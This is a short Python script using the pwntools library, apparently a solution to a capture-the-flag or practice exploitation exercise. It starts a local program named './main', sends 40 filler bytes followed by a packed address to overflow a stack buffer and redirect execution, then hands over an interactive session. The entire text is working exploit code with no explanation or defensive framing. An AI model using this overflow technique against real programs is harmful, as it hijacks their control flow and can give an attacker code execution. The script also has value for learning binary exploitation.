from pwn import *

p = process('./main')
p.sendline(b'A'*40+p64(0x0000000000401156))
p.interactive()